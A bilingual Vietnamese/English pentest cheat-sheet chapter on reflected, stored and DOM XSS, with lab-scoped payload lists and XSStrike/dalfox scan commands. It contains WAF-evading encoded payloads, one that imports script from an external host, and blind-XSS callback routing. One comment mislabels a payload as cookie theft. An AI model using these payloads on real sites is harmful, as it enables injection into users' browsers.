# 2. Cross-Site Scripting (XSS)

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

Cross-Site Scripting (XSS) xảy ra khi ứng dụng nhận dữ liệu không đáng tin cậy và hiển thị/thực thi nó trên trình duyệt của người dùng dưới dạng mã kịch bản (JavaScript) mà không được mã hóa hoặc làm sạch.

### 2.1. Reflected XSS (XSS phản xạ)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Phát sinh khi kịch bản độc hại được gửi kèm trong yêu cầu HTTP của nạn nhân, sau đó máy chủ phản chiếu (reflect) trực tiếp kịch bản này vào nội dung trang phản hồi mà không lưu trữ trong cơ sở dữ liệu.
    *   *English*: Reflected XSS occurs when a malicious script is included in the HTTP request sent by a victim. The server immediately reflects this script back into the HTTP response without persisting it in the database.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập một chuỗi ký tự ngẫu nhiên duy nhất (ví dụ: `xsscheck123`) vào các tham số đầu vào (URL Parameters, Search box). Xem mã nguồn trang (Page Source) hoặc DevTools Elements để tìm kiếm vị trí chuỗi đó hiển thị nhằm xác định ngữ cảnh (HTML tag, thuộc tính tag, hoặc khối script).
    *   *English*: Input a unique string (e.g., `xsscheck123`) into input fields or parameters. Inspect the DOM/Page Source to find where the string is reflected and identify the target context (HTML context, attribute context, or JavaScript context).
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-02-001 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.1. Reflected XSS (XSS phản xạ) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the vulnerable sink produces the local dialog or DOM marker once; context-correct encoding in the fixed fixture renders the bytes as text -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```html
    <!-- 1. Classic simple script execution payload. -->
    <script>alert(1)</script>

    <!-- 2. Breaks out of an HTML attribute to execute a script. -->
    "><script>alert(document.domain)</script>

    <!-- 3. Executes script via the image error event handler (bypass for blocked `<script>` tags). -->
    <img src=x onerror=alert(1)>

    <!-- 4. SVG onload event execution. -->
    <svg onload=alert(1)>

    <!-- 5. Injected into `href` or `src` attributes of anchors/frames. -->
    javascript:alert(1)

    <!-- 6. Breaks out of a JavaScript string variable definition. -->
    '-alert(1)-'

    <!-- 7. Closes an existing script tag and initiates a new one. -->
    </script><script>alert(1)</script>

    <!-- 8. Sub-document sandboxed execution payload. -->
    <iframe src="javascript:alert(1)"></iframe>

    <!-- 9. Body load event handler payload. -->
    <body onload=alert(1)>

    <!-- 10. Uses Base64 encoded payload (`YWxlcnQoMSk=` represents `alert(1)`) decoded at runtime via `eval(atob())`, with a slash separator `svg/onload` to bypass space and keyword signature-based WAFs. -->
    <svg/onload=eval(atob('YWxlcnQoMSk='))>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XSStrike để phân tích ngữ cảnh tham số hoặc dalfox để dò quét hàng loạt lỗi Reflected XSS.
    *   *English*: Use XSStrike to analyze reflected parameter contexts or dalfox for fast bulk reflected XSS scanning.
<!-- payload-id: CHEAT-02-002 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.1. Reflected XSS (XSS phản xạ) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable sink produces the local dialog or DOM marker once; context-correct encoding in the fixed fixture renders the bytes as text; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Scan Reflected XSS using XSStrike parameter detection
    python xsstrike.py -u "http://victim.lab.test/search.php?q=test"
    # Scan Reflected XSS with fast multi-threading tool dalfox
    dalfox url "http://victim.lab.test/search?q=test"
    ```

---


### 2.2. Stored XSS (XSS lưu trữ)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xảy ra khi mã độc được lưu trữ vĩnh viễn (persistent) trong cơ sở dữ liệu hoặc tệp tin trên máy chủ (ví dụ: bình luận, bài viết diễn đàn, thông tin tài khoản). Bất cứ người dùng nào truy cập vào trang hiển thị dữ liệu này sau đó đều bị kích hoạt mã độc trên trình duyệt.
    *   *English*: Stored XSS occurs when a malicious script is permanently stored on the target server (e.g., in a database, forum post, or profile field). The victim's browser executes the script when retrieving the stored data from the server.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Tìm các chức năng cho phép lưu trữ thông tin lâu dài và hiển thị cho người dùng khác (khung bình luận, biểu mẫu gửi liên hệ, cập nhật tên hiển thị). Gửi thử nghiệm các thẻ định dạng HTML và tải lại trang hoặc đăng nhập tài khoản khác để xem thẻ đó có hiển thị thô hay không.
    *   *English*: Target input vectors that persist data (comment sections, profile settings, ticket support forms). Submit HTML elements and verify if they load unescaped across sessions.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-02-003 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.2. Stored XSS (XSS lưu trữ) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the synthetic payload is stored and creates a local DOM/callback marker when viewed in the vulnerable profile; the fixed profile renders inert text -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```html
    <!-- 1. Basic stored testing payload. -->
    <script>alert('StoredXSS')</script>

    <!-- 2. Attempts session hijacking by exposing session cookies (if HTTPOnly is missing). -->
    <img src="empty.jpg" onerror="document.body.dataset.sechub='stored-xss-marker'">

    <!-- 3. Executed via HTML5 video loading failure. -->
    <video><source onerror="alert(1)"></video>

    <!-- 4. Modern tag event handler executing on toggle event. -->
    <details open ontoggle=alert(1)>

    <!-- 5. URI-based execution hidden within a hyperlink. -->
    <a href="javascript:alert(1)">Click to Win</a>

    <!-- 6. Double escaped payload utilizing the `srcdoc` attribute of an iframe. -->
    <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>

    <!-- 7. Execution via marquee start event. -->
    <marquee onstart=alert(1)>Scroll</marquee>

    <!-- 8. MathML tag link event execution (standard browser support). -->
    <math href="javascript:alert(1)">CLICK</math>

    <!-- 9. Self-triggering focus state payload. -->
    <select autofocus onfocus=alert(1)>

    <!-- 10. Uses Base64-encoded data URI in an `<object>` tag to completely hide the JavaScript syntax from signature scanners. -->
    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng XSStrike hoặc dalfox với session header để quét Stored XSS, hoặc gửi payload đến OOB Server.
    *   *English*: Use XSStrike or dalfox with session headers to scan for stored vectors, or route blind payloads to OOB servers.
<!-- payload-id: CHEAT-02-004 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.2. Stored XSS (XSS lưu trữ) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the synthetic payload is stored and creates a local DOM/callback marker when viewed in the vulnerable profile; the fixed profile renders inert text; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Scan Stored XSS on form endpoints by providing authenticated session headers
    python xsstrike.py -u "http://victim.lab.test/feedback" --data "name=user&msg=test" --headers "Cookie: PHPSESSID=abc123xyz"
    # Scan for Blind XSS (often Stored) routing payloads to your Out-of-Band callback server
    dalfox url "http://victim.lab.test/register?name=test" -b "https://callback.lab.test"
    ```

---

### 2.3. DOM-based XSS (XSS dựa trên DOM)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xảy ra hoàn toàn ở phía máy khách (Client-side). Lỗ hổng phát sinh khi các mã JavaScript của trang web đọc dữ liệu từ một nguồn không an sau (Source) và ghi trực tiếp vào một điểm nhận nhạy cảm có khả năng thực thi mã (Sink) mà không qua kiểm duyệt.
    *   *English*: DOM-based XSS is a client-side vulnerability. It occurs when JavaScript scripts on the page read from user-controlled inputs (Sources) and pass them to execution functions (Sinks) in the Document Object Model without sanitization.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Xem xét mã nguồn JavaScript trên trình duyệt (Developer Tools -> Sources) để tìm các nguồn dữ liệu có thể kiểm soát bởi người dùng (như `location.hash`, `location.search`, `document.referrer`) được truyền trực tiếp vào các hàm nguy hiểm (như `element.innerHTML`, `document.write`, `eval()`, `setTimeout()`).
    *   *English*: Analyze client-side JS scripts. Identify input sources (e.g., `location.hash`) feeding directly into dangerous sinks (e.g., `element.innerHTML`, `eval()`). Manipulate the URL hash or query parameters and trace execution flow.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-02-005 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.3. DOM-based XSS (XSS dựa trên DOM) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the documented source reaches the named DOM sink and creates a local marker; the fixed sink uses a text/URL-safe API and does not execute script -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```html
    <!-- 1. Hash parameter injected into a sink like `innerHTML`. -->
    #<img src=1 onerror=alert(1)>

    <!-- 2. Query parameter injected into a sink like `document.write`. -->
    ?name=<svg onload=alert(1)>

    <!-- 3. For navigation sinks: `location.href = source`. -->
    javascript:alert(1)

    <!-- 4. Escaping a JavaScript string/JSON variable context in the client script. -->
    ';alert(1);'

    <!-- 5. Escaped single quote bypass for client-side sanitizers. -->
    \';alert(1)//

    <!-- 6. Injected into attribute configuration sinks. -->
    "onmouseover="alert(1)

    <!-- 7. Dynamic Base64 payload for redirection sinks. -->
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

    <!-- 8. Breaks out of inline JavaScript code block/function contexts. -->
    }alert(1);{//

    <!-- 8b. AngularJS client-side template injection (sandbox breakout). -->
    {{constructor.constructor('alert(1)')()}}

    <!-- 9. Obfuscated JS execution inside redirection/eval sinks. -->
    javascript:eval(atob('YWxlcnQoMSk='))

    <!-- 10. Encoded payload using ES6 dynamic `import()` to load an external script, bypassing strict inline text scanning of target keywords. -->
    %23%3cimg%20src%3dx%20onerror%3d%22import('%68%74%74%70%73%3a%2f%2f%78%73%73%2e%72%65%70%6f%72%74')%22%3e
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng dalfox với tùy chọn `--deep-dom` để phân tích các source/sink client-side và phát hiện DOM XSS.
    *   *English*: Use dalfox with `--deep-dom` option to automatically analyze client-side sources/sinks and identify DOM XSS.
<!-- payload-id: CHEAT-02-006 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.3. DOM-based XSS (XSS dựa trên DOM) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the documented source reaches the named DOM sink and creates a local marker; the fixed sink uses a text/URL-safe API and does not execute script; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Scan DOM-based XSS by processing JavaScript sources and sinks automatically
    dalfox url "http://victim.lab.test/index.html?hash=test" --headless
    # Fuzz DOM inputs using custom wordlists containing browser-breakout payloads
    dalfox pipe < urls.txt --custom-payload /path/to/dom_payloads.txt
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP Cross Site Scripting Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
